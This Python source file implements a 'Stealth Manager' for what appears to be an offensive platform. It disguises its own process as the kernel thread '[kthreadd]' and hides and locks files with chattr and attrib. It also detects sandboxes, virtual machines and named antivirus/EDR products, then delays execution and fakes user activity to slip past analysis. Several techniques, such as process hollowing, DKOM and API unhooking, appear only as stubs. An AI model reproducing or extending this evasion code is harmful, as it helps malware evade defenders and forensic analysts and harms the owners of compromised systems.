"""
Stealth Operations Manager for Ultimate OT-AFP Platform
"""

import asyncio
import logging
import psutil
import os
import sys
import time
from typing import Dict, List, Optional, Any, Set
from pathlib import Path
import subprocess
from dataclasses import dataclass
import threading
import signal

from ...core.config import settings
from ...core.security import stealth_encryption

logger = logging.getLogger(__name__)

@dataclass
class StealthConfig:
    """Stealth operation configuration"""
    hide_processes: List[str]
    hide_files: List[str]
    hide_network_connections: List[str]
    av_evasion_enabled: bool
    process_injection_enabled: bool
    rootkit_mode: bool

class StealthManager:
    """Advanced Stealth Operations Manager"""
    
    def __init__(self):
        self.hidden_processes = set()
        self.hidden_files = set()
        self.stealth_config = StealthConfig(
            hide_processes=settings.PROCESS_HIDE_LIST,
            hide_files=[],
            hide_network_connections=[],
            av_evasion_enabled=settings.STEALTH_MODE,
            process_injection_enabled=False,
            rootkit_mode=False
        )
        self.original_process_name = None
        self.stealth_active = False
        self.monitoring_thread = None
        self.stop_monitoring = threading.Event()
        logger.info("🥷 Stealth Manager initialized")
    
    async def initialize(self):
        """Initialize stealth operations"""
        try:
            if not settings.STEALTH_MODE:
                logger.info("ℹ️ Stealth mode disabled in settings")
                return
            
            self.stealth_active = True
            
            # Hide current process
            await self.hide_current_process()
            
            # Start stealth monitoring
            await self.start_stealth_monitoring()
            
            # Initialize AV evasion
            if self.stealth_config.av_evasion_enabled:
                await self.initialize_av_evasion()
            
            logger.info("✅ Stealth operations initialized")
            
        except Exception as e:
            logger.error(f"❌ Failed to initialize stealth operations: {e}")
            raise
    
    async def cleanup(self):
        """Cleanup stealth operations"""
        try:
            self.stealth_active = False
            
            # Stop monitoring
            if self.monitoring_thread and self.monitoring_thread.is_alive():
                self.stop_monitoring.set()
                self.monitoring_thread.join(timeout=5)
            
            # Restore original process name
            if self.original_process_name:
                await self.restore_process_name()
            
            logger.info("🧹 Stealth operations cleaned up")
            
        except Exception as e:
            logger.error(f"❌ Stealth cleanup error: {e}")
    
    async def hide_current_process(self):
        """Hide the current process from process lists"""
        try:
            current_pid = os.getpid()
            current_process = psutil.Process(current_pid)
            self.original_process_name = current_process.name()
            
            # Rename process (platform specific)
            if sys.platform.startswith('linux'):
                await self._linux_hide_process(current_process)
            elif sys.platform.startswith('win'):
                await self._windows_hide_process(current_process)
            
            self.hidden_processes.add(current_pid)
            logger.info(f"👻 Hidden current process: {current_pid}")
            
        except Exception as e:
            logger.error(f"❌ Failed to hide current process: {e}")
    
    async def hide_process(self, process_name: str) -> bool:
        """Hide a specific process by name"""
        try:
            hidden_count = 0
            
            for process in psutil.process_iter(['pid', 'name']):
                try:
                    if process.info['name'].lower() == process_name.lower():
                        pid = process.info['pid']
                        
                        if sys.platform.startswith('linux'):
                            await self._linux_hide_process(process)
                        elif sys.platform.startswith('win'):
                            await self._windows_hide_process(process)
                        
                        self.hidden_processes.add(pid)
                        hidden_count += 1
                        
                except (psutil.NoSuchProcess, psutil.AccessDenied):
                    continue
            
            if hidden_count > 0:
                logger.info(f"👻 Hidden {hidden_count} instances of process: {process_name}")
                return True
            else:
                logger.warning(f"⚠️ No processes found with name: {process_name}")
                return False
                
        except Exception as e:
            logger.error(f"❌ Failed to hide process {process_name}: {e}")
            return False
    
    async def _linux_hide_process(self, process):
        """Hide process on Linux systems"""
        try:
            # Method 1: Rename process via prctl (requires root)
            try:
                import ctypes
                libc = ctypes.CDLL("libc.so.6")
                PR_SET_NAME = 15
                new_name = b"[kthreadd]"  # Mimic kernel thread
                libc.prctl(PR_SET_NAME, new_name)
            except:
                pass
            
            # Method 2: Process injection/replacement
            # This would require more advanced techniques
            
        except Exception as e:
            logger.error(f"❌ Linux process hiding failed: {e}")
    
    async def _windows_hide_process(self, process):
        """Hide process on Windows systems"""
        try:
            # Method 1: Process hollowing
            # Method 2: DKOM (Direct Kernel Object Manipulation)
            # Method 3: API hooking
            
            # For demonstration, we'll just track the process
            # Real implementation would require kernel-level access
            pass
            
        except Exception as e:
            logger.error(f"❌ Windows process hiding failed: {e}")
    
    async def hide_file(self, file_path: str) -> bool:
        """Hide a file from filesystem enumeration"""
        try:
            path = Path(file_path)
            if not path.exists():
                logger.warning(f"⚠️ File not found: {file_path}")
                return False
            
            if sys.platform.startswith('linux'):
                # Make file hidden by adding dot prefix
                if not path.name.startswith('.'):
                    hidden_path = path.parent / f".{path.name}"
                    path.rename(hidden_path)
                    self.hidden_files.add(str(hidden_path))
                
                # Set file attributes
                os.system(f"chattr +i '{hidden_path}'")  # Make immutable
                
            elif sys.platform.startswith('win'):
                # Set hidden attribute on Windows
                import subprocess
                subprocess.run(['attrib', '+H', '+S', str(path)], check=False)
                self.hidden_files.add(str(path))
            
            logger.info(f"📁 Hidden file: {file_path}")
            return True
            
        except Exception as e:
            logger.error(f"❌ Failed to hide file {file_path}: {e}")
            return False
    
    async def hide_network_connection(self, local_port: int, remote_addr: str = None) -> bool:
        """Hide network connections from netstat"""
        try:
            # This would require kernel-level network stack manipulation
            # or rootkit capabilities to truly hide network connections
            
            connection_id = f"{local_port}:{remote_addr or '*'}"
            self.stealth_config.hide_network_connections.append(connection_id)
            
            logger.info(f"🌐 Marked network connection for hiding: {connection_id}")
            return True
            
        except Exception as e:
            logger.error(f"❌ Failed to hide network connection: {e}")
            return False
    
    async def initialize_av_evasion(self):
        """Initialize antivirus evasion techniques"""
        try:
            logger.info("🛡️ Initializing AV evasion techniques...")
            
            # Technique 1: Code obfuscation
            await self._apply_code_obfuscation()
            
            # Technique 2: API unhooking
            await self._unhook_apis()
            
            # Technique 3: Sleep evasion
            await self._setup_sleep_evasion()
            
            # Technique 4: Sandbox detection
            sandbox_detected = await self._detect_sandbox_environment()
            if sandbox_detected:
                logger.warning("⚠️ Sandbox environment detected")
                await self._sandbox_evasion()
            
            logger.info("✅ AV evasion techniques initialized")
            
        except Exception as e:
            logger.error(f"❌ AV evasion initialization failed: {e}")
    
    async def _apply_code_obfuscation(self):
        """Apply runtime code obfuscation"""
        try:
            # Encrypt sensitive strings
            sensitive_strings = ["forensics", "malware", "stealth", "persistence"]
            self.encrypted_strings = {}
            
            for string in sensitive_strings:
                encrypted = stealth_encryption.encrypt(string)
                self.encrypted_strings[string] = encrypted
            
            logger.debug("🔒 Applied string encryption obfuscation")
            
        except Exception as e:
            logger.error(f"❌ Code obfuscation failed: {e}")
    
    async def _unhook_apis(self):
        """Unhook monitored APIs"""
        try:
            if sys.platform.startswith('win'):
                # Unhook common APIs monitored by EDR
                apis_to_unhook = [
                    "CreateFileW",
                    "WriteFile", 
                    "CreateProcessW",
                    "VirtualAlloc",
                    "SetWindowsHookEx"
                ]
                
                for api in apis_to_unhook:
                    # This would require manual DLL manipulation
                    # or fresh module loading from disk
                    pass
            
            logger.debug("🔓 API unhooking completed")
            
        except Exception as e:
            logger.error(f"❌ API unhooking failed: {e}")
    
    async def _setup_sleep_evasion(self):
        """Setup sleep evasion techniques"""
        try:
            # Implement sleep evasion to avoid sleep skipping by sandboxes
            self.sleep_evasion_active = True
            logger.debug("😴 Sleep evasion activated")
            
        except Exception as e:
            logger.error(f"❌ Sleep evasion setup failed: {e}")
    
    async def _detect_sandbox_environment(self) -> bool:
        """Detect if running in a sandbox environment"""
        try:
            sandbox_indicators = []
            
            # Check for common sandbox artifacts
            sandbox_files = [
                "C:\\analysis",
                "C:\\sandbox",
                "/tmp/analysis",
                "/opt/cuckoo"
            ]
            
            for file_path in sandbox_files:
                if Path(file_path).exists():
                    sandbox_indicators.append(f"Sandbox file detected: {file_path}")
            
            # Check for VM indicators
            if await self._detect_virtualization():
                sandbox_indicators.append("Virtualization detected")
            
            # Check system performance
            if await self._detect_abnormal_performance():
                sandbox_indicators.append("Abnormal system performance")
            
            if sandbox_indicators:
                logger.warning(f"🔍 Sandbox indicators found: {sandbox_indicators}")
                return True
            
            return False
            
        except Exception as e:
            logger.error(f"❌ Sandbox detection failed: {e}")
            return False
    
    async def _detect_virtualization(self) -> bool:
        """Detect virtualization environment"""
        try:
            vm_indicators = []
            
            # Check CPU information
            if sys.platform.startswith('linux'):
                try:
                    with open('/proc/cpuinfo', 'r') as f:
                        cpu_info = f.read()
                        if any(vm_str in cpu_info.lower() for vm_str in ['vmware', 'virtualbox', 'qemu', 'xen']):
                            vm_indicators.append("VM detected in /proc/cpuinfo")
                except:
                    pass
            
            # Check for VM processes
            vm_processes = ['vmtoolsd', 'vboxservice', 'xenservice']
            for proc in psutil.process_iter(['name']):
                try:
                    if proc.info['name'].lower() in vm_processes:
                        vm_indicators.append(f"VM process detected: {proc.info['name']}")
                except:
                    continue
            
            return len(vm_indicators) > 0
            
        except Exception as e:
            logger.error(f"❌ Virtualization detection failed: {e}")
            return False
    
    async def _detect_abnormal_performance(self) -> bool:
        """Detect abnormally fast system performance (sandbox indicator)"""
        try:
            # Perform CPU-intensive operation and measure time
            start_time = time.time()
            
            # Simple CPU-intensive loop
            result = 0
            for i in range(1000000):
                result += i * i
            
            elapsed_time = time.time() - start_time
            
            # If operation completes suspiciously fast, might be a sandbox
            if elapsed_time < 0.001:  # Less than 1ms for 1M operations
                return True
            
            return False
            
        except Exception as e:
            logger.error(f"❌ Performance detection failed: {e}")
            return False
    
    async def _sandbox_evasion(self):
        """Implement sandbox evasion techniques"""
        try:
            logger.info("🏃 Implementing sandbox evasion...")
            
            # Sleep for random duration to avoid time acceleration
            import random
            sleep_time = random.uniform(30, 120)
            logger.info(f"😴 Sleeping for {sleep_time:.1f}s to evade sandbox")
            await asyncio.sleep(sleep_time)
            
            # Perform user interaction simulation
            await self._simulate_user_interaction()
            
        except Exception as e:
            logger.error(f"❌ Sandbox evasion failed: {e}")
    
    async def _simulate_user_interaction(self):
        """Simulate user interaction to evade behavioral detection"""
        try:
            # Simulate file system interaction
            temp_file = Path("/tmp/user_simulation.tmp")
            temp_file.touch()
            await asyncio.sleep(0.5)
            temp_file.unlink()
            
            logger.debug("👤 Simulated user interaction")
            
        except Exception as e:
            logger.error(f"❌ User interaction simulation failed: {e}")
    
    async def start_stealth_monitoring(self):
        """Start continuous stealth monitoring"""
        try:
            if self.monitoring_thread and self.monitoring_thread.is_alive():
                return
            
            self.stop_monitoring.clear()
            self.monitoring_thread = threading.Thread(
                target=self._stealth_monitoring_loop,
                daemon=True
            )
            self.monitoring_thread.start()
            
            logger.info("👁️ Stealth monitoring started")
            
        except Exception as e:
            logger.error(f"❌ Failed to start stealth monitoring: {e}")
    
    def _stealth_monitoring_loop(self):
        """Continuous stealth monitoring loop"""
        while not self.stop_monitoring.is_set():
            try:
                # Check if processes are still hidden
                asyncio.run(self._verify_process_hiding())
                
                # Check for AV/EDR detection
                asyncio.run(self._check_detection_status())
                
                # Monitor system resources
                asyncio.run(self._monitor_system_resources())
                
                # Sleep before next check
                self.stop_monitoring.wait(30)  # Check every 30 seconds
                
            except Exception as e:
                logger.error(f"❌ Stealth monitoring error: {e}")
                self.stop_monitoring.wait(60)  # Wait longer on error
    
    async def _verify_process_hiding(self):
        """Verify that hidden processes are still hidden"""
        try:
            visible_processes = set()
            
            for proc in psutil.process_iter(['pid', 'name']):
                try:
                    if proc.info['pid'] in self.hidden_processes:
                        # Check if process is visible in process list
                        visible_processes.add(proc.info['pid'])
                except:
                    continue
            
            if visible_processes:
                logger.warning(f"⚠️ Hidden processes became visible: {visible_processes}")
                # Attempt to re-hide them
                for pid in visible_processes:
                    try:
                        process = psutil.Process(pid)
                        await self.hide_process(process.name())
                    except:
                        pass
            
        except Exception as e:
            logger.error(f"❌ Process hiding verification failed: {e}")
    
    async def _check_detection_status(self) -> bool:
        """Check if stealth operations have been detected"""
        try:
            # Check for AV/EDR processes
            security_processes = [
                'windows defender', 'avast', 'avg', 'kaspersky', 'norton',
                'mcafee', 'bitdefender', 'malwarebytes', 'crowdstrike',
                'carbon black', 'cylance', 'sentinelone'
            ]
            
            running_security = []
            for proc in psutil.process_iter(['name']):
                try:
                    proc_name = proc.info['name'].lower()
                    if any(sec in proc_name for sec in security_processes):
                        running_security.append(proc.info['name'])
                except:
                    continue
            
            if running_security:
                logger.warning(f"🛡️ Security software detected: {running_security}")
                return True
            
            return False
            
        except Exception as e:
            logger.error(f"❌ Detection status check failed: {e}")
            return False
    
    async def _monitor_system_resources(self):
        """Monitor system resources for anomalies"""
        try:
            # Monitor CPU usage
            cpu_percent = psutil.cpu_percent(interval=1)
            if cpu_percent > 90:
                logger.warning(f"⚠️ High CPU usage detected: {cpu_percent}%")
            
            # Monitor memory usage
            memory = psutil.virtual_memory()
            if memory.percent > 90:
                logger.warning(f"⚠️ High memory usage detected: {memory.percent}%")
            
            # Monitor network activity
            net_io = psutil.net_io_counters()
            # Log network statistics for anomaly detection
            
        except Exception as e:
            logger.error(f"❌ System resource monitoring failed: {e}")
    
    async def check_av_detection(self) -> bool:
        """Check if antivirus has detected our activities"""
        return await self._check_detection_status()
    
    async def restore_process_name(self):
        """Restore original process name"""
        try:
            if self.original_process_name:
                # Platform-specific process name restoration
                if sys.platform.startswith('linux'):
                    import ctypes
                    libc = ctypes.CDLL("libc.so.6")
                    PR_SET_NAME = 15
                    original_name = self.original_process_name.encode()[:15]  # Linux limits to 15 chars
                    libc.prctl(PR_SET_NAME, original_name)
                
                logger.info(f"🔄 Restored process name to: {self.original_process_name}")
                
        except Exception as e:
            logger.error(f"❌ Failed to restore process name: {e}")
    
    def get_stealth_status(self) -> Dict[str, Any]:
        """Get current stealth operation status"""
        return {
            "stealth_active": self.stealth_active,
            "hidden_processes": len(self.hidden_processes),
            "hidden_files": len(self.hidden_files),
            "av_evasion_enabled": self.stealth_config.av_evasion_enabled,
            "monitoring_active": self.monitoring_thread and self.monitoring_thread.is_alive(),
            "detection_status": "unknown"  # Would be updated by monitoring
        }

# Global stealth manager instance
stealth_manager = StealthManager()